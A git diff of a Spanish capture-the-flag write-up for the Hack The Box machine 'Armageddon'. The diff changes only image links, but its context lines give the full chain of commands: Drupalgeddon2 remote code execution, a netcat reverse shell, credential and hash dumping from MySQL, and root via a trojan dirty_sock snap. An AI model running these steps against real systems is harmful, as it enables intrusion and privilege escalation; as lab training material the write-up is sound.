@@ -1,6 +1,6 @@
 # ARMAGEDDON MACHINE
 
-![[Pasted image 20210519224421.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/1.png)
 
 ## ENUMERACION
 
@@ -8,7 +8,7 @@
 nmap -p- --open -T5 -v -n 10.10.10.233 -oG allPorts
 ```
 
-![[Pasted image 20210519224541.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/2.png)
 
 vemos 2 puertos abiertos, vamos a enumerar sus servicios:
 
@@ -16,7 +16,7 @@ vemos 2 puertos abiertos, vamos a enumerar sus servicios:
 nmap -p22,80 -sC -sV -oN targeted
 ```
 
-![[Pasted image 20210519224859.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/3.png)
 
 El puerto 22 es SSH quiza para conectarnos posteriormente.
 
@@ -24,11 +24,11 @@ El puerto 80 es una pagina web, un drupal 7 en un servidor apache y con PHP 5.4.
 
 Veamos que tiene la pagina:
 
-![[Pasted image 20210519225107.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/4.png)
 
 veamos si el robots.txt nosd dice algo:
 
-![[Pasted image 20210519225208.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/5.png)
 
 vemos algunos directorios pero nada interesante.
 
@@ -38,15 +38,15 @@ Veamos con wfuzz si hay algun otro directorio que no nos muestra el robots.txt:
 wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.10.233/FUZZ
 ```
 
-![[Pasted image 20210519225523.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/6.png)
 
 Vemos el directorio sites, vamos a ver que hay ahi:
 
-![[Pasted image 20210519225602.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/7.png)
 
 si vamos a default vemos lo siguiente:
 
-![[Pasted image 20210519225646.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/8.png)
 
 Vemos archivos de configuracion pero con extension en .php y no podemos ver el contenido a nivel web porque nos lo interpreta el .php
 
@@ -59,7 +59,7 @@ Vamos a buscar en searchsploit si esa version de drupal tiene alguna vulnerabili
 searchsploit drupal 7
 ```
 
-![[Pasted image 20210519230219.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/10.png)
 
 Entre muchas cosas vi un RCE en python, lo copiamos en nuestro directorio:
 
@@ -69,7 +69,7 @@ searchsploit -m php/webapps/44448.py
 
 Y al ver su contenido vemos que tiene un CVE asociado:
 
-![[Pasted image 20210519230345.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/11.png)
 
 Si buscamos en google ese CVE y le agregamos github vemos un repositorio interesante:
 
@@ -83,7 +83,7 @@ wget https://raw.githubusercontent.com/pimps/CVE-2018-7600/master/drupa7-CVE-201
 
 analizamos el codigo y vemos los parametros que tiene:
 
-![[Pasted image 20210519230741.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/12.png)
 
 Vemos que con la opcion **-c** agregamos un comando a ejecutar y por defecto realiza un **id**. ademas se le indica un target que es la pagina con drupal.
 
@@ -93,7 +93,7 @@ Como el script esta en python 3 ("#!/usr/bin/env python3") lo vamos a ejecutar y
 python3 drupa7-CVE-2018-7600.py http://10.10.10.233/
 ```
 
-![[Pasted image 20210519231039.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/13.png)
 
 vemos que si nos ejecuta comandos remotamente, entonces vamos a entablarnos una reverse shell:
 
@@ -104,7 +104,7 @@ donde 10.10.14.235 es nuestra IP
 donde 443 es el puerto al que estamos en escucha con netcat
 ```
 
-![[Pasted image 20210519231517.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/14.png)
 
 Debe estar con comillas simples la opcion -c para que funcione, en todo caso siempre se debe probar con comillas dobles o simples.
 
@@ -128,11 +128,11 @@ python3 drupa7-CVE-2018-7600.py http://10.10.10.233/ -c 'echo -n "base64_encoded
 
 El -n en el echo es para no mostrar salida al imprimir:
 
-![[Pasted image 20210519232117.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/15.png)
 
 vemos el contenido en donde nos encontramos y vemos una carpeta sites (que es donde estaban los archivos de configuracion):
 
-![[Pasted image 20210519232333.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/16.png)
 
 vamos a sites/defaults y vemos el contenido del archivo settigns.php:
 
@@ -144,7 +144,7 @@ cat settings.php
 
 vamos a ver unas credenciales de mysql:
 
-![[Pasted image 20210519232545.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/17.png)
 
 vamos a ver si nos podemos conectar:
 
@@ -152,15 +152,15 @@ vamos a ver si nos podemos conectar:
 mysql -u drupaluser -D drupal -pCQHEy@9M*m23gBVj
 ```
 
-![[Pasted image 20210519232728.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/18.png)
 
 No nos muestra nada veamos si podemos ejecutar un **show tables;**
 
-![[Pasted image 20210519232825.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/19.png)
 
 si despues de poner la sentencia ponemos un quit si nos muestra el comando, hay un parametro que es el -e que nos ejecuta un comando y al final quit en uno solo:
 
-![[Pasted image 20210519233026.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/20.png)
 
 ahi vamos a ejecutar las sentencias:
 
@@ -174,7 +174,7 @@ de todas las tablas que se lista vemos una que es users, vamos a realizar que ca
 mysql -u drupaluser -D drupal -pCQHEy@9M*m23gBVj -e 'show columns from users;'
 ```
 
-![[Pasted image 20210519233742.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/22.png)
 
 nos interesa name y pass:
 
@@ -182,7 +182,7 @@ nos interesa name y pass:
 mysql -u drupaluser -D drupal -pCQHEy@9M*m23gBVj -e 'select name,pass from users;'
 ```
 
-![[Pasted image 20210519233859.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/24.png)
 
 tenemos unas credenciales:
 
@@ -195,7 +195,7 @@ podemos comprobar que es un usuario del sistema con:
 cat /etc/passwd
 ```
 
-![[Pasted image 20210519234100.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/25.png)
 
 
 vamos a cracker el hash con hashcat:
@@ -204,7 +204,7 @@ Existe un modulo de hashcat para contraseñas de drupal 7 que es el 7900:
 
 [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
 
-![[Pasted image 20210519234241.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/26.png)
 
 Y se ve que tiene la misma estructura del hash que tenemos $S$.
 
@@ -218,7 +218,7 @@ donde hash es un archivo que creamos donde colocamos solo el hash
 
 Despues de un rato vemos que logramos obtener la contraseña con --show:
 
-![[Pasted image 20210519234649.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/27.png)
 
 Recordando que el puerto 22 esta abierto vamos a conectarnos:
 
@@ -230,7 +230,7 @@ ssh brucetherealadmin@10.10.10.233
 booboo
 ```
 
-![[Pasted image 20210519234835.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/28.png)
 
 Estamos dentro y podemos ver la flag
 
@@ -243,7 +243,7 @@ veamos que tenemos con sudo -l:
 sudo -l
 ```
 
-![[Pasted image 20210519234925.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/29.png)
 
 Vemos que podemos ejecutar **/usr/bin/snap install** como sudo.
 
@@ -259,7 +259,7 @@ buscamos en searchsploit algo:
 searchsploit snap
 ```
 
-![[Pasted image 20210520103430.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/30.png)
 
 Vemos uno que llama la atencion que dice local prilivilege escalation, es esta caso ya estamos dentro del la maquia asi que puede sar algo local, necesitamos escalar privilegios y usaremos la version 2 por ser la ultima y suponemos que debe estar actualizada. Nos lo copiamos en nuestro directorio:
 
@@ -269,7 +269,7 @@ searchsploit -m linux/local/46362.py
 
 entendamos un poco que hace este script:
 
-![[Pasted image 20210520103940.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/31.png)
 
 primero nos indica que esta vulnerabilidad se la conoce como dirty_sock y que la version vulnerable de snap tiene que ser menor a la **2.37.1** eso lo podemos comprobar con:
 
@@ -277,25 +277,25 @@ primero nos indica que esta vulnerabilidad se la conoce como dirty_sock y que la
 snap version
 ```
 
-![[Pasted image 20210520104137.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/32.png)
 
 la version de la maquina es mayor por lo que no es vulnerable, pero podemos ejecutarla como sudo asi que veamos que es lo que hace este script:
 
-![[Pasted image 20210520104507.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/33.png)
 
 Al parecer al ejecutar este script y si la version era vulnerable nos lo creaba un usuario con nombre y contraseña: dirty_sock y este usuario tiene permisos en el archivo sudoers. Es decir que su hacemos sudo su y ponemos la contraseña de dirty_sock ya seriamos root. Veamos como lo hacia para ver si nos ayuda:
 
-![[Pasted image 20210520104702.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/34.png)
 
 Este snap malicioso en base64 se lo debe introducir dentro de un .snap ya decodificado y asi es como lo envian a una API de snap para que se instale automaticamente:
 
-![[Pasted image 20210520105412.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/35.png)
 
 entonces como nosotros podemos ejecutar snap como sudo podemos crear ese .snap malicioso e instalarlo de modo que se nos crea un usuario dirty_sock. Eso es lo que vamos a hacer. Primero nos copiamos la parte del TROJAN_SNAP del script y lo ejecutamos en python para obtener su salida:
 
  copiamos con nano o vim:
  
- ![[Pasted image 20210520105858.png]]
+ ![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/36.png)
  
  ejecutamos python y pegamos el contenido:
  
@@ -321,7 +321,7 @@ AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''+ 'A' * 425
  ```
  
  
-![[Pasted image 20210520110135.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/37.png)
 
 esta es nuestra salida:
 
@@ -375,7 +375,7 @@ si vemos el contenido de test.snap vemos como ejecuta un comando:
 cat test.snap
 ```
 
-![[Pasted image 20210520110729.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/38.png)
 
 ahora lo instalamos como sudo y usamos la configuracion de devmode ya que es lo que usa este script:
 
@@ -383,11 +383,11 @@ ahora lo instalamos como sudo y usamos la configuracion de devmode ya que es lo 
 sudo /usr/bin/snap install test.snap --devmode
 ```
 
-![[Pasted image 20210520110901.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/40.png)
 
 y esto deberia crearnos el usuario dirty_sock:
 
-![[Pasted image 20210520110935.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/41.png)
 
 se os creo el usuario:
 
@@ -409,4 +409,4 @@ dirty_sock
 
 y listo somos rott y podemos ver la flag:
 
-![[Pasted image 20210520111210.png]]
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARMAGEDDON/images/42.png)
